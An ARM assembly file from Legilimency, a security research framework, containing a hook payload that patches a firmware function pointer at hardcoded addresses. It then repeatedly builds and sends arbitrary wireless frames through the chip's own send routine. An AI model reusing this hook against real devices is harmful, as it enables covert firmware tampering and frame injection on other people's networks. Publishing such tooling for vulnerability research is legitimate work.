//  Legilimency - Memory Analysis Framework for iOS
//  --------------------------------------
//
//  Written and maintained by Gal Beniamini <laginimaineb@google.com>
//
//  Copyright 2017 Google Inc. All Rights Reserved.
//  Licensed under the Apache License, Version 2.0 (the "License");
//  you may not use this file except in compliance with the License.
//  You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//  Unless required by applicable law or agreed to in writing, software
//  distributed under the License is distributed on an "AS IS" BASIS,
//  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//  See the License for the specific language governing permissions and
//  limitations under the License.

.code 16
  PUSH {R0}
  ADR R0, hook_arm
  BX R0

.code 32
.align 4
hook_arm:
  POP {R0}

  PUSH {R4-R11, LR}

  //Restoring the original function pointer to prevent being called more than once
  LDR R0, wl_hc_addr
  LDR R1, wl_hc_orig_func
  STR R1, [R0]
  LDR R11, ctx
 
  //Looping the wanted number of injection repetitions
  LDR R9, num_injections
  MOV R8, #0
loop:
  CMP R8, R9
  BGE ret_zero
 
  //Getting the frame
  LDR R0, [R11, #4]     
  LDR R1, frame_size    
  LDR R4, get_frame_func
  BLX R4  
  MOV R10, R0

  //Populating the frame
  LDR R0, [R10, #8]
  ADR R1, frame_contents
  LDR R2, frame_size
  LDR R4, memcpy
  BLX R4 

  //Sending the frame
  LDR R0, [R11, #8]     
  MOV R1, #0            
  MOV R2, R10           
  MOV R3, #1            
  LDR R4, send_func
  BLX R4
 
  ADD R8, R8, #1
  B loop

ret_zero:
  //Returning zero
  MOV R0, #0
  POP {R4-R11, PC}

.align 4
wl_hc_addr:
  .word 0x2078B0

.align 4
wl_hc_orig_func:
  .word 0x17FB55

.align 4
ctx:
  .word 0x2058BC

.align 4
get_frame_func:
  .word 0x70E0+1

.align 4
send_func:
  .word 0x3E678+1

.align 4
memcpy:
  .word 0x3DAC+1

.align 4
num_injections:
  .word 0xBEEFBEEF

.align 4
frame_size:
  .word 0xF12A515E

.align 4
frame_contents:
  .space 1024,0xAB
